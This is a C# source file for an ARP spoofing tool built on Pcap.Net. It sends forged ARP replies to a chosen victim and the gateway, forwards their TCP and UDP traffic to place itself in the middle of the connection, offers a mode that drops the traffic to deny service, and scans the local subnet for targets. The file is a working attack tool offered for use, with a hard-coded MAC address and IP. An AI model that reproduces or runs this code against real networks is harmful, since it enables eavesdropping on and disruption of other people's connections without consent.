using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;

namespace ArpSpoofer
{
    class Program
    {
        public static string victimIp;
        public static List<string> victimIps;
        static string targetIp;
        static string victimMac;
        static string targetMac;
        static string myIp;
        static string myMac;
        static string finalyMyMac;
        static string finalTargetMac;
        static string finalVictimMac;
        static PacketCommunicator communicator;
        static PacketCommunicator communicator2;
        static List<string> foundIps = new List<string>();
        static bool dos = false;
        static bool spoof = true;


        static void Main(string[] args)
        {
            try
            {
                if (args[0] == "-h")
                {
                    Console.WriteLine("Welcome to arp spoofer here's your argument options 'ArpSpoofer.exe' + ");
                    Console.WriteLine("'-a [victim ip] [Gateway-ip]'  for an arp spoof attack");
                    Console.WriteLine("'-d [victim ip] [Gateway-ip]' for an denial of service attack on victim");
                    Console.WriteLine("'-s' to search for devices on your network to target");

                }
                else if (args[0] == "-a")
                {
                    victimIp = args[1];
                    targetIp = args[2];
                    Attack();

                }
                else if (args[0] == "-d")
                {
                    victimIp = args[1];
                    targetIp = args[2];
                    dos = true;
                    Attack();
                }
                else if (args[0] == "-s")
                {
                    myMac = "F06E0BCCA2E7";
                    myIp = "192.168.0.9";
                    List<char> temp4 = new List<char>();
                    int w = 0;
                    foreach (char b in myMac)
                    {
                        if (w < 2)
                        {
                            temp4.Add(b);
                            w++;
                        }
                        else
                        {

                            temp4.Add(':');
                            temp4.Add(b);
                            w = 1;
                        }
                    }
                    finalyMyMac = string.Concat(temp4);


                    Listen();

                }
                else
                {
                    Console.WriteLine("That wasnt an option: type in 'ArpSpoofer.exe -h' for help");
                }
            }
            catch (IndexOutOfRangeException)
            {
                Console.WriteLine("No arguments were provided");
                Console.WriteLine("Use cmd and type in 'ArpSpoofer.exe -h' for help. Make sure cmd is in the " +
                    "same directory as ArpSpoofer.exe");
            }
            
        }
        public static void Attack()
        {
            Console.WriteLine("Retrieving mac address...");
            
            victimMac = GetMacAddress(victimIp);
            targetMac = GetMacAddress(targetIp);
            bool failed = false;
            if (!char.IsLetter(victimMac[0]) && !char.IsNumber(victimMac[0]) && !char.IsPunctuation(victimMac[0]))
            {
                Console.WriteLine("Failed to retrieve victim's mac address");
                failed = true;
            }
            else
            {
                Console.WriteLine("Retrieved Victim Mac Address: " + victimMac);
            }
            if (!char.IsLetter(targetMac[0]) && !char.IsNumber(targetMac[0]) && !char.IsPunctuation(targetMac[0]))
            {
                Console.WriteLine("Failed to retrieve target's mac address");
                failed = true;
            }
            else
            {
                Console.WriteLine("Retrieved target's Mac Address: " + targetMac);
            }
            if (failed == false)
            {
                PcatThings();
            }
        }
        public static void Listen()
        {

            // Retrieve the interfaces list
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            // Scan the list printing every entry
            for (int i = 0; i != allDevices.Count(); ++i)
            {
                DevicePrint(allDevices[i]);
            }
            Console.WriteLine("Your Mac Address is " + myMac);
            Console.WriteLine("Enter 1-" + allDevices.Count() + " for the adapter you want to use to listen with");
            int option = Convert.ToInt32(Console.ReadLine());
            PacketDevice selectedDevice = allDevices[option - 1];


            communicator2 = selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);
            Thread Listener = new Thread(()=>StartListening(communicator2));
            Thread Sender = new Thread(FindDevices);
            Listener.Start();
            Sender.Start();
            Console.WriteLine("Searching for devices....");
            while (Sender.IsAlive == true)
            {

            }
            Thread.Sleep(60000);
            communicator2.Break();
            Console.WriteLine("Ip                  Device Name");
            List<string> done = new List<string>();
            foreach(string s in foundIps)
            {
                bool can = true;
                foreach (string d in done)
                {
                    if(d == s)
                    {
                        can = false;
                    }
                }
                if (can == true)
                {
                    try
                    {
                        Console.WriteLine(s + "         " + Dns.GetHostEntry(s).HostName.ToString());
                    }
                    catch (Exception)
                    {
                        Console.WriteLine(s + "         " + "Unknown");
                    }
                    done.Add(s);
                }
            }
            try
            {
                Console.WriteLine(myIp + "         " + Dns.GetHostEntry(myIp).HostName.ToString());
            }
            catch (Exception)
            {
                Console.WriteLine(myIp + "         " + "Unknown");
            }
            Console.WriteLine("Complete Search! If you think a device is missing try searching again");

        }
        public static void StartListening(PacketCommunicator communicator2)
        {
            communicator2.ReceivePackets(0, PacketHandler2);
        }
        private static void PacketHandler2(Packet packet)
        {
            
            if(packet.DataLink.Kind == DataLinkKind.Ethernet)
            {
                if(packet.Ethernet.EtherType == EthernetType.Arp)
                {
                    
                    if (packet.Ethernet.Destination.ToString() == finalyMyMac)
                    {
                        
                        
                        foundIps.Add(packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString());
                    }
                }
            }
        }
            public static void FindDevices()
        {
         
            for (int i = 0; i < 256; i++)
            {
                for (int j = 0; j < 256; j++)
                {
                    SendArpRequests("192.168." + i + "." + j);
                }
            }
        }

        public static void SendArpRequests(string tempIp)
        {


            IPAddress address = IPAddress.Parse(myIp);
            IPAddress address2 = IPAddress.Parse(tempIp);
            Byte[] bytes = address.GetAddressBytes();
            Byte[] bytes2 = address2.GetAddressBytes();
            Byte[] h = PhysicalAddress.Parse(myMac).GetAddressBytes();
             Byte[] g = PhysicalAddress.Parse("000000000000").GetAddressBytes();
            EthernetLayer ethernetLayer =
        new EthernetLayer
        {
            Source = new MacAddress(finalyMyMac),

                    Destination = new MacAddress("00:00:00:00:00:00"),
                    EtherType = EthernetType.Arp, // Will be filled automatically.
                };
            ArpLayer arpLayer =
                new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = new byte[] { h[0], h[1], h[2], h[3], h[4], h[5] }.AsReadOnly(), // 03:03:03:03:03:03.
                    SenderProtocolAddress = new byte[] { bytes[0], bytes[1], bytes[2], bytes[3] }.AsReadOnly(), // 1.2.3.4.
                    TargetHardwareAddress = new byte[] { g[0], g[1], g[2], g[3], g[4], g[5] }.AsReadOnly(),                                                             // TargetHardwareAddress = new byte[] { g[0], g[1], g[2], g[3], g[4], g[5] }.AsReadOnly(), // 04:04:04:04:04:04.
                            TargetProtocolAddress = new byte[] { bytes2[0], bytes2[1], bytes2[2], bytes2[3] }.AsReadOnly(), // 11.22.33.44.
                };
            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);


            communicator2.SendPacket(builder.Build(DateTime.Now));
            

        }
        public static void PcatThings()
        {
            myMac = (from nic in NetworkInterface.GetAllNetworkInterfaces()
                     where nic.OperationalStatus == OperationalStatus.Up
                     select nic.GetPhysicalAddress().ToString()
    ).FirstOrDefault();
            myMac = "F06E0BCCA2E7";
            // Retrieve the interfaces list
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            // Scan the list printing every entry
            for (int i = 0; i != allDevices.Count(); ++i)
            {
                DevicePrint(allDevices[i]);
            }
            Console.WriteLine("Your Mac Address is " + myMac);
            Console.WriteLine("Enter 1-" + allDevices.Count() + " for the adapter you want to use to listen with");
            int option = Convert.ToInt32(Console.ReadLine());
            PacketDevice selectedDevice = allDevices[option - 1];


             communicator = selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);

            Console.WriteLine("Listening on " + selectedDevice.Description + "...");
            Console.WriteLine("Preparing to send packet!!");

            Thread spoofer = new Thread(() => spoofing(communicator));
            spoofer.Start();

            // start the capture
            
            char[] targetMacS = new char[17];
            char[] victimMacS = new char[17];
            for (int i = 0; i < 17; i++)
            {
              
                
                    targetMacS[i] = targetMac[i];
                
                    victimMacS[i] = victimMac[i];
                
            }
            List<char> temp4 = new List<char>();
            int w = 0;
            foreach (char b in myMac)
            {
                if (w < 2)
                {
                    temp4.Add(b);
                    w++;
                }
                else
                {

                    temp4.Add(':');
                    temp4.Add(b);
                    w = 1;
                }
            }
            finalyMyMac = string.Concat(temp4);
            List<char> temp5 = new List<char>();
            int x = 0;
            foreach (char b in targetMacS)
            {
                if (x < 2)
                {
                    temp5.Add(b);
                    x++;
                }
                else
                {
                    temp5.Add(':');
                    x = 0;
                }
            }
            finalTargetMac = string.Concat(temp5);
            List<char> temp6 = new List<char>();
            int y = 0;
            foreach (char b in victimMacS)
            {
                if (y< 2)
                {
                    temp6.Add(b);
                    y++;
                }
                else
                {
                    temp6.Add(':');
                    y = 0;
                }
            }
            finalVictimMac = string.Concat(temp6);
            Console.WriteLine("Attack has started Successfully");
            Console.WriteLine("Press esc to end attack");
            Thread endThread = new Thread(End);
            endThread.Start();
            
                communicator.ReceivePackets(0, PacketHandler);
            
            Console.WriteLine("Attack ended!");







        }
        public static void End()
        {
            while (true)
            {
                if(Console.ReadKey(true).Key == ConsoleKey.Escape)
                {
                    break;
                }
            }
            communicator.Break();
            spoof = false;
        }
        public static void spoofing(PacketCommunicator communicator)
        {
            while (spoof == true)
            {
                Thread.Sleep(2000);
                communicator.SendPacket(ArpSpooferSending(victimIp, victimMac, targetIp, myMac,false));
               // Thread.Sleep(100);
                communicator.SendPacket(ArpSpooferSending(targetIp, targetMac, victimIp, myMac,true));


            }
        }
        public static Packet ArpSpooferSending(string victimIp1, string victimMac1, string targetIp1, string myMac1,bool router)
        {
            List<string> myMacByte = new List<string>();
            int temp = 0;
            string temp2 = "";
            foreach(char c in myMac1)
            {
                if(temp == 0)
                {
                    temp2 = c.ToString();
                }
                else if(temp == 1)
                {
                    temp2 = temp2 + c;
                    myMacByte.Add(temp2);
                    temp = 0;
                }
                
            }
            
            char[] temp3 = new char[17];
            for(int i = 0; i < 17; i++)
            {
                temp3[i] = victimMac1[i];
            }
            string test = string.Concat(temp3);
           // Console.WriteLine("Test is: " + test);
            Byte[] h = PhysicalAddress.Parse(myMac1).GetAddressBytes();
            Byte[] g = PhysicalAddress.Parse(temp3).GetAddressBytes();
            
            IPAddress address = IPAddress.Parse(targetIp1);
            Byte[] bytes = address.GetAddressBytes();
            IPAddress address2 = IPAddress.Parse(victimIp1);
            Byte[] bytes2 = address2.GetAddressBytes();
            
            List<char> temp5 = new List<char>();
            int x = 0;
            

            //Console.WriteLine("Mac1 original = "+myMac1+" Mac1 = " + string.Concat(temp4));
            //  Console.WriteLine("victimMac1 = " + string.Concat(temp5));
            string fin;
            if(router == false)
            {
                fin = finalVictimMac;
            }
            else
            {
                fin = finalTargetMac;
            }
            EthernetLayer ethernetLayer =
                new EthernetLayer
                {
                    Source = new MacAddress(finalyMyMac),
                   
                    Destination = new MacAddress(fin),
                    EtherType = EthernetType.Arp, // Will be filled automatically.
                };
            ArpLayer arpLayer =
                new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = new byte[] {h[0],h[1],h[2],h[3],h[4],h[5] }.AsReadOnly(), // 03:03:03:03:03:03.
                    SenderProtocolAddress = new byte[] { bytes[0],bytes[1],bytes[2],bytes[3] }.AsReadOnly(), // 1.2.3.4.
                    TargetHardwareAddress = new byte[] { g[0], g[1], g[2], g[3], g[4], g[5] }.AsReadOnly(), // 04:04:04:04:04:04.
                    TargetProtocolAddress = new byte[] { bytes2[0], bytes2[1], bytes2[2], bytes2[3] }.AsReadOnly(), // 11.22.33.44.
                };
            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);

            return builder.Build(DateTime.Now);

        }
        // Callback function invoked by Pcap.Net for every incoming packet
        private static void PacketHandler(Packet packet)
        {

           // Console.WriteLine(packet.Timestamp.ToString("yyyy-MM-dd hh:mm:ss.fff") + " length:" + packet.Length);
            IpV4Datagram ip = packet.Ethernet.IpV4;
            UdpDatagram udp = ip.Udp;
            EthernetLayer ethernetLayer = (EthernetLayer)packet.Ethernet.ExtractLayer();
           // Console.WriteLine(ethernetLayer.Source.ToString() + " was source and " + finalVictimMac.ToUpper() + " is victim");
            if (ethernetLayer.Source.ToString() == finalVictimMac.ToUpper())
            {
                try
                {
                    //using (BerkeleyPacketFilter filter = communicator.CreateFilter("tcp or udp or ip"))
                    //  {
                    // Set the filter
                    //     communicator.SetFilter(filter);
                    //  }
                    //Console.WriteLine("Sendung packets to router");
                    if (dos == false)
                    {
                        communicator.SendPacket(forwardPacket(packet, true));
                    }
                }catch(Exception e)
                {
                    Console.WriteLine(e);
                }
                //Console.WriteLine("Packet source " + ip.Source + " packet destination " + ip.Destination);
            }
            else if(ethernetLayer.Source.ToString() == finalTargetMac.ToUpper())
            {
                try
                {
                    //Console.WriteLine("Sendung packets to target");
                    if (dos == false)
                    {
                        communicator.SendPacket(forwardPacket(packet, false));
                    }
                }catch(Exception e) { 
                }
            }
            
            
        }
        public static Packet forwardPacket(Packet packet,bool router)
        {
            EthernetLayer ethernetLayer = (EthernetLayer)packet.Ethernet.ExtractLayer();
            IpV4Layer ipV4Layer = (IpV4Layer)packet.Ethernet.IpV4.ExtractLayer();
            
            if (router == true)
            {
                ethernetLayer.Destination = new MacAddress(finalTargetMac);
            }
            else
            {
                ethernetLayer.Destination = new MacAddress(finalVictimMac);
            }
            ethernetLayer.Source = new MacAddress(string.Concat(finalyMyMac));
            DateTime packetTimestamp = packet.Timestamp;

            if (packet.Ethernet.IpV4.Protocol == IpV4Protocol.Tcp)
            {
                TcpLayer tcpLayer = (TcpLayer)packet.Ethernet.IpV4.Tcp.ExtractLayer();
               tcpLayer.Checksum = packet.Ethernet.IpV4.Tcp.Checksum;
                ILayer payload = packet.Ethernet.IpV4.Tcp.Payload.ExtractLayer();
                try
                {
                    return PacketBuilder.Build(packetTimestamp, ethernetLayer, ipV4Layer, tcpLayer, payload);
                }
                catch (NullReferenceException ) {
                    Console.WriteLine("target is offline or something went wrong try again");
                    communicator.Break();
                }
            }
            else if (packet.Ethernet.IpV4.Protocol == IpV4Protocol.Udp)
            {
                UdpLayer udpLayer = (UdpLayer)packet.Ethernet.IpV4.Udp.ExtractLayer();
                udpLayer.Checksum = packet.Ethernet.IpV4.Udp.Checksum;
                ILayer payload = packet.Ethernet.IpV4.Udp.Payload.ExtractLayer();
                return PacketBuilder.Build(packetTimestamp, ethernetLayer, ipV4Layer, udpLayer, payload);
            }
            
            else
            {
                
            }
            return null;
        }
        // Print all the available information on the given interface
        private static void DevicePrint(IPacketDevice device)
        {
            // Name
            Console.WriteLine(device.Name);

            // Description
            if (device.Description != null)
                Console.WriteLine("\tDescription: " + device.Description);

            // Loopback Address
          //  Console.WriteLine("\tLoopback: " +
                            //  (((device.Attributes & DeviceAttributes.Loopback) == DeviceAttributes.Loopback)
                               //    ? "yes"
                               //    : "no"));

            // IP addresses
            foreach (DeviceAddress address in device.Addresses)
            {
                Console.WriteLine("\tAddress Family: " + address.Address.Family);

                if (address.Address != null)
                    Console.WriteLine(("\tAddress: " + address.Address));
                if (address.Netmask != null)
                    //Console.WriteLine(("\tNetmask: " + address.Netmask));
                if (address.Broadcast != null)
                  //  Console.WriteLine(("\tBroadcast Address: " + address.Broadcast));
                if (address.Destination != null)
                    Console.WriteLine(("\tDestination Address: " + address.Destination));
            }
            Console.WriteLine();
        }
       
        public static string GetMacAddress(string ip)
        {
            System.Diagnostics.Process pProcess1 = new System.Diagnostics.Process();
            pProcess1.StartInfo.FileName = "ping";
            pProcess1.StartInfo.Arguments = ip;
            pProcess1.StartInfo.UseShellExecute = false;
            pProcess1.StartInfo.RedirectStandardOutput = true;
            pProcess1.StartInfo.CreateNoWindow = true;
            pProcess1.Start();
            string strOutput2 = pProcess1.StandardOutput.ReadToEnd();
           
            
            
            string macAddress = string.Empty;
            System.Diagnostics.Process pProcess2 = new System.Diagnostics.Process();
            pProcess2.StartInfo.FileName = "arp";
            pProcess2.StartInfo.Arguments = "-a " +ip;
            pProcess2.StartInfo.UseShellExecute = false;
            pProcess2.StartInfo.RedirectStandardOutput = true;
            pProcess2.StartInfo.CreateNoWindow = true;
            pProcess2.Start();
            string strOutput = pProcess2.StandardOutput.ReadToEnd();
           
            bool letter = false;
            bool number = false;
            bool found = false;
            char[] mac = new char[1000];
            int i = 0;
            int j = 0;
            char p = '2';
            foreach(char c in strOutput)
            {
                j++;
                if(j < 12)
                {
                    continue;
                }
                if (found == false)
                {
                    if (letter == false)
                    {
                        if (char.IsLetter(c) == true)
                        {
                            letter = true;
                        }
                    }
                    else
                    {
                        if (number == false)
                        {
                            if (char.IsNumber(c))
                            {
                                number = true;
                            }
                        }
                        else
                        {
                            if (!char.IsWhiteSpace(c) && !c.Equals('.'))
                            {
                                if (char.IsWhiteSpace(p))
                                {
                                    mac[i] = c;
                                    i++;
                                    found = true;
                                }
                            }
                        }
                    }
                }
                else
                {
                    if (!char.IsWhiteSpace(c)){
                        mac[i] = c;
                        i++;
                    }
                    else
                    {
                        break;
                    }
                }
                p = c;
            }
            string fMac = string.Concat(mac);
            return fMac;

            
        }
    }
}
